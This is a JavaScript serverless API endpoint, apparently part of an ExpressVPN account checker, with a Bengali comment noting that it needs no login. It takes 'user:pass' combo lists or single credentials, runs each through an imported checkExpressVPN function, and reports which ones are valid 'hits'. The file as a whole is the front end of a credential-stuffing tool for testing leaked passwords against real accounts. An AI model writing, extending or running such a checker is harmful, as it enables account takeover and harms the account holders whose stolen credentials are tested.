// api/check.js – লগইন ছাড়াই (আগের মতো)
import { checkExpressVPN } from '../lib/expressChecker.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { username, password, combos } = req.body;

  if (combos && Array.isArray(combos) && combos.length > 0) {
    const results = [];
    for (const combo of combos) {
      const [u, p] = combo.split(':');
      if (!u || !p) { results.push({ combo, valid: false, hit: false, message: 'Invalid' }); continue; }
      const r = await checkExpressVPN(u.trim(), p.trim());
      results.push({ combo, ...r });
    }
    return res.status(200).json({ results });
  }

  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });
  const result = await checkExpressVPN(username, password);
  return res.status(200).json(result);
}
